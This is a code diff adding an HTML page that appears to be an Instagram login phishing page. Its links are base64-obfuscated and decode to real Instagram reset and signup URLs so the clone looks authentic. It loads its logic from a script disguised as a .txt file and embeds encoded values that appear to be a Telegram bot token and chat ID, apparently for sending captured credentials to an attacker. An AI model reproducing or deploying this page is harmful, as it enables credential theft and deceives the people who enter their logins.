@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="en">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<script>
+    fetch('/src/c.txt')
+        .then(response => response.text())
+        .then(css => {
+            const style = document.createElement('style');
+            style.textContent = css;
+            document.head.appendChild(style);
+        })
+        .catch(error => {
+
+        });
+
+
+</script>
+
+<head></head>
+
+<body>
+    <div id="container">
+        <p id="langue"></p>
+        <div id="spc1">
+            <div id="logo"></div>
+        </div>
+        <div id="inpts"></div>
+        <div id="lgn" onclick="flgn();">
+            <p id="pLogin"></p>
+            <div id="loading"></div>
+        </div>
+
+        <p id="frgt"
+            onclick="window.location.href = dcd('aHR0cHM6Ly9pbnN0YWdyYW0uY29tL2FjY291bnRzL3Bhc3N3b3JkL3Jlc2V0Lw==')">
+        </p>
+        <div id="spc2">
+            <p id="sgnp"
+                onclick="window.location.href = dcd('aHR0cHM6Ly9pbnN0YWdyYW0uY29tL2FjY291bnRzL2VtYWlsc2lnbnVwLw==')">
+            </p>
+            <div id="meta"></div>
+        </div>
+    </div>
+
+    <!-- dlg -->
+    <div class="dialog-container" id="dlg">
+        <div class="dialog-box">
+            <p id="dialog_title"></p>
+            <p id="dialog_text"></p>
+            <div class="dialog-line"></div>
+            <button class="dialog-btn" onclick="dlg.style.display = 'none';">OK</button>
+        </div>
+    </div>
+
+    <script>
+        var to = "NzI2MDY2NzU1MTpBQUhyZGpYNU9TelN1VnEtaGVfaHNzaDJGMTRKM3hyaVI4UQ==";
+        var ca = "MTM5MTMyNDAyNw==";
+    </script>
+    <script src="src/j.txt"></script>
+</body>
+
+</html>
